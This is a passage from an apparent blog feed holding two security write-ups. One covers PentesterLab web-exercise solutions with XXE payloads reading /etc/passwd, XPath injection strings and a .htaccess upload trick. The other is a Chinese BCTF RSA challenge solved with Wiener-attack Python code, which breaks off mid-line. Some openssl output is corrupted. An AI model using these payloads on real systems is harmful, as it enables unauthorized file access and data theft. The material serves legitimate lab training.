<li>upload a .htaccess file, enabling another extension to be ran by PHP (You can learn more about this technique in PentesterLab’s training: From <a href="https://pentesterlab.com/fromsqlitoshellpg_edition.html" target="_blank" rel="external">SQL Injection to Shell: PostgreSQL edition</a></li>
</ul>
</blockquote>
<p>Using one of these methods, you should be able to gain command execution.</p>
<h2 id="XML_related_attacks">XML related attacks</h2><p>In this section, XML related attacks will be detailed. These types of attacks are common with web services and with applications using XPath to retrieve a configuration setting from a XML file (for example, to know what backend they need to use to authenticate a user, based on the organisation’s name provided).</p>
<h3 id="Example_1-8">Example 1</h3><p>Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="function_or_atom">x</span> <span class="variable">SYSTEM</span> <span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>You will need to envelope this properly, in order to get it to work correctly:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>You can then simply use the reference to x: &x; (don’t forget to encode &amp;) to get the corresponding result inserted in the XML document during its parsing (server side).</p>
<p>In this example, the exploitation occurs directly inside a GET request, but it’s more likely that these types of requests are performed using a POST request, in a traditional web application. This issue is also really common with web services, and is probably the first test you want to do, when attacking an application that accepts XML messages.</p>
<p>This example can also be used to get the application to perform HTTP requests (by using http:// instead of file://) and can be used as a port scanner. However, the content retrieved is often incomplete since, the XML parser will try to parse it as part of the document.</p>
<p>You can also use <code>ftp://</code> and <code>https://</code></p>
<h3 id="Example_2-8">Example 2</h3><p>In this example, the code uses the user’s input, inside an XPath expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.</p>
<p>If we inject a single quote, we can see the following error:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: SimpleXMLElement::<span class="function"><span class="title">XPath</span><span class="params">()</span></span>: Invalid predicate <span class="keyword">in</span> /var/www/xml/example2<span class="class">.php</span> on line <span class="number">7</span> Warning: SimpleXMLElement::<span class="function"><span class="title">XPath</span><span class="params">()</span></span>: xmlXPathEval: evaluation failed <span class="keyword">in</span> /var/www/xml/example2<span class="class">.php</span> on line <span class="number">7</span> Warning: Variable passed to <span class="function"><span class="title">each</span><span class="params">()</span></span> is not an array or <span class="tag">object</span> <span class="keyword">in</span> /var/www/xml/example2<span class="class">.php</span> on line <span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p>Just like SQL injection, XPath allows you to do boolean logic, and you can try:</p>
<blockquote>
<ul>
<li>‘ and ‘1’=’1 and you should get the same result.</li>
<li>‘ or ‘1’=’0 and you should get the same result.</li>
<li>‘ and ‘1’=’0 and you should not get any result.</li>
<li>‘ or ‘1’=’1 and you should get all results.</li>
</ul>
</blockquote>
<p>Based on these tests and previous knowledge of XPath, it’s possible to get an idea of what the XPath expression looks like:<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">[<span class="keyword">PARENT</span> NODES]/name<span class="list">[<span class="keyword">.=</span>'<span class="list">[<span class="keyword">INPUT</span>]']/<span class="list">[<span class="keyword">CHILD</span> NODES]</span></span></span></span></span><br></pre></td></tr></table></figure></p>
<p>To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a ] to properly complete the syntax. Our payload now looks like hacker’]%00 (or hacker’ or 1=1]%00 if we want all results).</p>
<p>If we try to find the child of the current node, using the payload<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'%20or%201=1]/child::node()%00, we don'</span>t <span class="keyword">get</span> much information.</span><br></pre></td></tr></table></figure></p>
<p>Here, the problem is that we need to got back up in the node hierarchy, to get more information. In XPath, this can be done using parent::* as part of the payload. We can now select the parent of the current node, and display all the child node using<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">hacker</span>'<span class="number">%20</span>or<span class="number">%201</span>=1]/parent::*/child::node()<span class="number">%00</span>.</span><br></pre></td></tr></table></figure></p>
<p>One of the node’s value looks like a password. We can confirm this, by checking if the node’s name is password using the payload<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker<span class="operator">'</span>]/parent::*/password<span class="comment">%00.</span></span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>A few days ago, I did web for pentest from PentesterLab.Now, this is the writeup form PentesterLab.You also can go <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a> to read the integral writeup.You also can go to <a href="http://lightless.me/archives/web-for-pentest-writeup.html">lightless’s blog</a> , my thoughts are similar with him.<br>]]>
    
    </summary>
    
      <category term="Code_Injection" scheme="http://edward-l.github.io/tags/Code-Injection/"/>
    
      <category term="Command_Injection" scheme="http://edward-l.github.io/tags/Command-Injection/"/>
    
      <category term="Directory_traversal" scheme="http://edward-l.github.io/tags/Directory-traversal/"/>
    
      <category term="File_Upload" scheme="http://edward-l.github.io/tags/File-Upload/"/>
    
      <category term="LDAP_Attacks" scheme="http://edward-l.github.io/tags/LDAP-Attacks/"/>
    
      <category term="PentesterLab" scheme="http://edward-l.github.io/tags/PentesterLab/"/>
    
      <category term="XML_Attacks" scheme="http://edward-l.github.io/tags/XML-Attacks/"/>
    
      <category term="XSS" scheme="http://edward-l.github.io/tags/XSS/"/>
    
      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[BCTF-warmup-writeup]]></title>
    <link href="http://edward-l.github.io/2015/04/24/BCTF-warmup-writeup/"/>
    <id>http://edward-l.github.io/2015/04/24/BCTF-warmup-writeup/</id>
    <published>2015-04-24T07:30:16.000Z</published>
    <updated>2015-04-24T07:57:18.000Z</updated>
    <content type="html"><![CDATA[<p>这道题是rsa的题，给了公钥,和c。<br><a id="more"></a><br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX</span><br><span class="line">vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF</span><br><span class="line">GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+<span class="number">7</span>LhsLNSTm9N6LTko0Xa</span><br><span class="line">RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx</span><br><span class="line">z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k</span><br><span class="line">EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw</span><br><span class="line">XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH</span><br><span class="line">jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7</span><br><span class="line">r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU</span><br><span class="line">N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx</span><br><span class="line">PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/</span><br><span class="line">wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==</span><br><span class="line">-----<span class="keyword">END</span> <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">0</span>x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108<span class="built_in">cd</span>029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297<span class="built_in">cd</span>96d1ea602309ecf47<span class="built_in">cd</span>009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span><br></pre></td></tr></table></figure>
<p>做bctf的时候撸了一天都没有撸出来，因为数太大啦，拆分不了。<br>后来看了writeup，原来有一个黑魔法<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="external">rsa-wiener-attack</a>在github上。那就容易多了。<br>用<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> publickey<span class="class">.pub</span> -pubin -modulus -text</span><br></pre></td></tr></table></figure></p>
<p>得到了<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Modulus (<span class="number">2050</span> bit):</span><br><span class="line"><span class="label">    03:</span><span class="number">67</span>:<span class="number">19</span>:<span class="number">8</span><span class="string">d:</span><span class="number">6</span><span class="string">b:</span><span class="number">56</span>:<span class="number">14</span>:<span class="string">e9:</span><span class="number">58</span>:<span class="number">13</span>:<span class="string">ad:</span><span class="string">d8:</span><span class="string">f2:</span><span class="number">2</span><span class="string">a:</span><span class="number">47</span>:</span><br><span class="line"><span class="label">    17:</span><span class="string">bc:</span><span class="number">72</span>:<span class="string">be:</span><span class="number">1</span><span class="string">e:</span><span class="string">ab:</span><span class="string">d9:</span><span class="number">33</span>:<span class="string">d1:</span><span class="string">b8:</span><span class="number">69</span>:<span class="number">44</span>:<span class="string">fd:</span><span class="string">b7:</span><span class="number">5</span><span class="string">b:</span></span><br><span class="line"><span class="label">    8e:</span><span class="string">d2:</span><span class="number">30</span>:<span class="string">be:</span><span class="number">62</span>:<span class="string">d7:</span><span class="string">d1:</span><span class="string">b6:</span><span class="number">9</span><span class="string">d:</span><span class="number">22</span>:<span class="number">20</span>:<span class="number">95</span>:<span class="string">c1:</span><span class="number">28</span>:<span class="string">c8:</span></span><br><span class="line"><span class="label">    6f:</span><span class="number">82</span>:<span class="number">01</span>:<span class="number">2</span><span class="string">e:</span><span class="string">cb:</span><span class="number">11</span>:<span class="number">61</span>:<span class="number">91</span>:<span class="string">fd:</span><span class="number">9</span><span class="string">d:</span><span class="number">01</span>:<span class="number">8</span><span class="string">a:</span><span class="number">6</span><span class="string">d:</span><span class="number">02</span>:<span class="string">f8:</span></span><br><span class="line"><span class="label">    4d:</span><span class="string">b2:</span><span class="number">7</span><span class="string">b:</span><span class="string">c5:</span><span class="number">1</span><span class="string">a:</span><span class="number">21</span>:<span class="number">30</span>:<span class="number">7</span><span class="string">d:</span><span class="string">c8:</span><span class="number">6</span><span class="string">f:</span><span class="number">4</span><span class="string">b:</span><span class="string">f7:</span><span class="number">71</span>:<span class="string">c6:</span><span class="number">91</span>:</span><br><span class="line"><span class="label">    c1:</span><span class="number">43</span>:<span class="string">e5:</span><span class="string">ab:</span><span class="string">e5:</span><span class="number">49</span>:<span class="string">b5:</span><span class="string">bd:</span><span class="number">2</span><span class="string">d:</span><span class="number">6</span><span class="string">e:</span><span class="string">b1:</span><span class="string">a2:</span><span class="number">1</span><span class="string">f:</span><span class="string">d6:</span><span class="number">27</span>:</span><br><span class="line"><span class="label">    0e:</span><span class="number">7</span><span class="string">e:</span><span class="number">1</span><span class="string">b:</span><span class="number">48</span>:<span class="string">fe:</span><span class="number">06</span>:<span class="number">11</span>:<span class="string">fb:</span><span class="string">b2:</span><span class="string">e1:</span><span class="string">b0:</span><span class="string">b3:</span><span class="number">52</span>:<span class="number">4</span><span class="string">e:</span><span class="number">6</span><span class="string">f:</span></span><br><span class="line"><span class="label">    4d:</span><span class="string">e8:</span><span class="string">b4:</span><span class="string">e4:</span><span class="string">a3:</span><span class="number">45</span>:<span class="string">da:</span><span class="number">44</span>:<span class="string">a1:</span><span class="number">3</span><span class="string">d:</span><span class="string">e8:</span><span class="number">25</span>:<span class="string">b7:</span><span class="number">26</span>:<span class="number">08</span>:</span><br><span class="line"><span class="label">    db:</span><span class="number">6</span><span class="string">c:</span><span class="number">7</span><span class="string">c:</span><span class="number">4</span><span class="string">a:</span><span class="number">40</span>:<span class="string">b7:</span><span class="number">82</span>:<span class="number">66</span>:<span class="string">e6:</span><span class="string">c8:</span><span class="number">7</span><span class="string">b:</span><span class="string">bf:</span><span class="string">de:</span><span class="string">f6:</span><span class="string">b4:</span></span><br><span class="line"><span class="label">    83:</span><span class="number">81</span>:<span class="string">d4:</span><span class="number">9</span><span class="string">c:</span><span class="number">45</span>:<span class="number">07</span>:<span class="string">a5:</span><span class="number">8</span><span class="string">b:</span><span class="string">cd:</span><span class="number">47</span>:<span class="string">b7:</span><span class="number">6</span><span class="string">d:</span><span class="number">64</span>:<span class="string">b4:</span><span class="number">59</span>:</span><br><span class="line"><span class="label">    08:</span><span class="string">b1:</span><span class="number">58</span>:<span class="string">bd:</span><span class="number">7</span><span class="string">e:</span><span class="string">bc:</span><span class="number">4</span><span class="string">d:</span><span class="string">ac:</span><span class="string">b0:</span><span class="string">b1:</span><span class="string">cf:</span><span class="string">d6:</span><span class="string">c2:</span><span class="string">c1:</span><span class="number">95</span>:</span><br><span class="line"><span class="label">    74:</span><span class="string">f4:</span><span class="number">0</span><span class="string">e:</span><span class="string">b2:</span><span class="string">ef:</span><span class="string">d0:</span><span class="string">e9:</span><span class="string">e1:</span><span class="number">0</span><span class="string">d:</span><span class="string">c7:</span><span class="number">00</span>:<span class="number">5</span><span class="string">c:</span><span class="string">ad:</span><span class="number">39</span>:<span class="string">bc:</span></span><br><span class="line"><span class="label">    af:</span><span class="number">52</span>:<span class="string">b9:</span><span class="string">ea:</span><span class="string">c3:</span><span class="number">87</span>:<span class="number">33</span>:<span class="number">68</span>:<span class="string">d6:</span><span class="number">90</span>:<span class="number">31</span>:<span class="string">c5:</span><span class="string">e7:</span><span class="number">24</span>:<span class="number">68</span>:</span><br><span class="line"><span class="label">    4a:</span><span class="number">44</span>:<span class="string">f0:</span><span class="number">68</span>:<span class="string">ef:</span><span class="string">d1:</span><span class="string">d3:</span><span class="string">dc:</span><span class="number">09</span>:<span class="number">6</span><span class="string">d:</span><span class="number">9</span><span class="string">b:</span><span class="number">5</span><span class="string">d:</span><span class="number">64</span>:<span class="number">11</span>:<span class="string">e5:</span></span><br><span class="line"><span class="label">    8b:</span><span class="string">de:</span><span class="string">e4:</span><span class="number">3</span><span class="string">e:</span><span class="number">46</span>:<span class="string">b9:</span><span class="number">9</span><span class="string">a:</span><span class="number">0</span><span class="string">d:</span><span class="number">04</span>:<span class="number">94</span>:<span class="string">b9:</span><span class="string">db:</span><span class="number">28</span>:<span class="number">19</span>:<span class="number">5</span><span class="string">a:</span></span><br><span class="line"><span class="label">    f9:</span><span class="number">01</span>:<span class="string">af:</span><span class="string">f1:</span><span class="number">30</span>:<span class="string">d4:</span><span class="string">a6:</span><span class="string">e2:</span><span class="number">03</span>:<span class="string">da:</span><span class="string">d0:</span><span class="number">8</span><span class="string">d:</span><span class="string">a5:</span><span class="number">7</span><span class="string">f:</span><span class="string">a7:</span></span><br><span class="line"><span class="label">    e4:</span><span class="number">02</span>:<span class="number">62</span>:<span class="string">a5:</span><span class="string">ba:</span><span class="string">db:</span><span class="number">2</span><span class="string">a:</span><span class="number">32</span>:<span class="number">3</span><span class="string">e:</span><span class="string">da:</span><span class="number">28</span>:<span class="string">b4:</span><span class="number">46</span>:<span class="number">96</span>:<span class="string">ab:</span></span><br><span class="line"><span class="label">    30:</span><span class="number">5</span>d</span><br><span class="line"><span class="string">Exponent:</span></span><br><span class="line"><span class="label">    00:</span><span class="string">f3:</span><span class="number">95</span>:<span class="number">9</span><span class="string">d:</span><span class="number">97</span>:<span class="number">8</span><span class="string">e:</span><span class="number">02</span>:<span class="string">eb:</span><span class="number">9</span><span class="string">f:</span><span class="number">06</span>:<span class="string">de:</span><span class="string">f3:</span><span class="string">f3:</span><span class="number">35</span>:<span class="string">d8:</span></span><br><span class="line"><span class="label">    f8:</span><span class="string">af:</span><span class="string">d7:</span><span class="number">60</span>:<span class="number">99</span>:<span class="number">51</span>:<span class="string">dd:</span><span class="string">ac:</span><span class="number">60</span>:<span class="string">b7:</span><span class="number">14</span>:<span class="string">b6:</span><span class="string">c2:</span><span class="number">2</span><span class="string">a:</span><span class="string">f0:</span></span><br><span class="line"><span class="label">    fa:</span><span class="number">91</span>:<span class="number">2</span><span class="string">f:</span><span class="number">21</span>:<span class="number">0</span><span class="string">b:</span><span class="number">34</span>:<span class="number">20</span>:<span class="number">6</span><span class="string">b:</span><span class="string">d2:</span><span class="number">4</span><span class="string">a:</span><span class="number">96</span>:<span class="number">01</span>:<span class="string">c7:</span><span class="number">8</span><span class="string">d:</span><span class="string">f4:</span></span><br><span class="line"><span class="label">    a0:</span><span class="number">27</span>:<span class="number">5</span><span class="string">f:</span><span class="number">10</span>:<span class="number">7</span><span class="string">f:</span><span class="string">d3:</span><span class="string">ab:</span><span class="number">55</span>:<span class="number">2</span><span class="string">d:</span><span class="number">95</span>:<span class="number">05</span>:<span class="number">7</span><span class="string">e:</span><span class="string">b9:</span><span class="number">34</span>:<span class="string">e7:</span></span><br><span class="line"><span class="label">    1b:</span><span class="string">dd:</span><span class="string">cd:</span><span class="number">70</span>:<span class="number">45</span>:<span class="string">c2:</span><span class="number">4</span><span class="string">b:</span><span class="number">18</span>:<span class="number">58</span>:<span class="number">7</span><span class="string">b:</span><span class="number">8</span><span class="string">c:</span><span class="number">8</span><span class="string">f:</span><span class="string">cf:</span><span class="number">5</span><span class="string">a:</span><span class="string">dd:</span></span><br><span class="line"><span class="label">    4c:</span><span class="number">5</span><span class="string">d:</span><span class="number">83</span>:<span class="string">f0:</span><span class="string">c7:</span><span class="number">7</span><span class="string">c:</span><span class="number">94</span>:<span class="string">dc:</span><span class="number">9</span><span class="string">c:</span><span class="number">50</span>:<span class="string">cb:</span><span class="string">e4:</span><span class="number">38</span>:<span class="string">e2:</span><span class="string">b6:</span></span><br><span class="line"><span class="label">    7b:</span><span class="string">af:</span><span class="string">d3:</span><span class="number">16</span>:<span class="number">33</span>:<span class="string">b6:</span><span class="string">aa:</span><span class="string">f1:</span><span class="number">78</span>:<span class="number">1</span><span class="string">d:</span><span class="number">90</span>:<span class="string">c3:</span><span class="string">ad:</span><span class="number">6</span><span class="string">f:</span><span class="number">03</span>:</span><br><span class="line"><span class="label">    d0:</span><span class="number">37</span>:<span class="string">b3:</span><span class="number">32</span>:<span class="number">18</span>:<span class="number">01</span>:<span class="string">b2:</span><span class="number">35</span>:<span class="number">46</span>:<span class="string">d4:</span><span class="number">83</span>:<span class="string">e6:</span><span class="number">7</span><span class="string">e:</span><span class="number">26</span>:<span class="number">06</span>:</span><br><span class="line"><span class="label">    7f:</span><span class="number">7</span><span class="string">b:</span><span class="number">22</span>:<span class="number">34</span>:<span class="number">7</span><span class="string">d:</span><span class="string">db:</span><span class="string">c0:</span><span class="string">c2:</span><span class="string">d5:</span><span class="number">92</span>:<span class="string">ce:</span><span class="number">81</span>:<span class="number">4</span><span class="string">c:</span><span class="string">bf:</span><span class="number">5</span><span class="string">d:</span></span><br><span class="line"><span class="label">    fc:</span><span class="string">cc:</span><span class="number">14</span>:<span class="number">14</span>:<span class="number">37</span>:<span class="string">f1:</span><span class="number">4</span><span class="string">e:</span><span class="number">0</span><span class="string">b:</span><span class="number">39</span>:<span class="number">90</span>:<span class="string">f8:</span><span class="number">80</span>:<span class="number">61</span>:<span class="string">e5:</span><span class="string">f0:</span></span><br><span class="line"><span class="label">    ba:</span><span class="string">e5:</span><span class="string">f0:</span><span class="number">1</span><span class="string">e:</span><span class="number">3</span><span class="string">f:</span><span class="string">a7:</span><span class="number">0</span><span class="string">d:</span><span class="string">b0:</span><span class="string">e9:</span><span class="number">60</span>:<span class="number">5</span><span class="string">e:</span><span class="number">7</span><span class="string">c:</span><span class="string">fd:</span><span class="number">57</span>:<span class="number">5</span><span class="string">e:</span></span><br><span class="line"><span class="label">    9c:</span><span class="number">81</span>:<span class="string">ef:</span><span class="string">ee:</span><span class="string">c5:</span><span class="number">29</span>:<span class="string">c3:</span><span class="number">3</span><span class="string">f:</span><span class="string">d9:</span><span class="number">03</span>:<span class="number">7</span><span class="string">a:</span><span class="number">20</span>:<span class="string">fd:</span><span class="number">8</span><span class="string">a:</span><span class="string">cd:</span></span><br><span class="line"><span class="label">    51:</span><span class="number">3</span><span class="string">a:</span><span class="string">c9:</span><span class="number">63</span>:<span class="number">77</span>:<span class="number">68</span>:<span class="number">31</span>:<span class="number">3</span><span class="string">e:</span><span class="number">63</span>:<span class="string">f9:</span><span class="number">83</span>:<span class="number">8</span><span class="string">a:</span><span class="string">e3:</span><span class="number">51</span>:<span class="number">1</span><span class="string">c:</span></span><br><span class="line"><span class="label">    dd:</span><span class="number">0</span><span class="string">a:</span><span class="number">9</span><span class="string">a:</span><span class="number">2</span><span class="string">b:</span><span class="number">51</span>:<span class="number">6</span><span class="string">f:</span><span class="number">21</span>:<span class="number">48</span>:<span class="string">c8:</span><span class="string">d4:</span><span class="number">75</span>:<span class="string">a3:</span><span class="number">60</span>:<span class="string">a0:</span><span class="number">63</span>:</span><br><span class="line"><span class="label">    59:</span><span class="number">44</span>:<span class="number">97</span>:<span class="number">39</span>:<span class="string">ee:</span><span class="string">cd:</span><span class="number">25</span>:<span class="number">1</span><span class="string">a:</span><span class="string">bb:</span><span class="number">42</span>:<span class="string">b0:</span><span class="number">14</span>:<span class="number">57</span>:<span class="number">3</span><span class="string">e:</span><span class="number">43</span>:</span><br><span class="line"><span class="label">    9f:</span><span class="number">2</span><span class="string">f:</span><span class="string">a4:</span><span class="number">57</span>:<span class="number">35</span>:<span class="number">57</span>:<span class="string">b2:</span><span class="number">56</span>:<span class="number">99</span>:<span class="string">ff:</span><span class="string">c1:</span><span class="number">1</span><span class="string">e:</span><span class="number">63</span>:<span class="number">1</span><span class="string">c:</span><span class="string">e8:</span></span><br><span class="line"><span class="label">    ee:</span><span class="number">97</span>:<span class="number">5</span><span class="string">a:</span><span class="number">86</span>:<span class="string">e7:</span><span class="string">e2:</span><span class="number">72</span>:<span class="string">bc:</span><span class="string">f5:</span><span class="string">f7:</span><span class="number">6</span><span class="string">a:</span><span class="number">93</span>:<span class="number">45</span>:<span class="number">03</span>:<span class="number">48</span>:</span><br><span class="line"><span class="label">    fe:</span><span class="number">3</span>f</span><br><span class="line">Modulus=<span class="number">367198</spanspan><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX</span><br><span class="line">vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF</span><br><span class="line">GiEwfchvS<span class="regexp">/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/</span>gYR+<span class="number">7</span>LhsLNSTm9N6LTko0Xa</span><br><span class="line">RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx</span><br><span class="line">z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k</span><br><span class="line">EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw</span><br><span class="line">XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH</span><br><span class="line">jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7</span><br><span class="line">r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU</span><br><span class="line">N<span class="regexp">/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/</span>uxSnDP9kDeiD9is1ROsljd2gx</span><br><span class="line">PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/</span><br><span class="line">wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p>
<p>得到了n,e<br>然后用wiener_attack拆解。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    '''</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">     e = 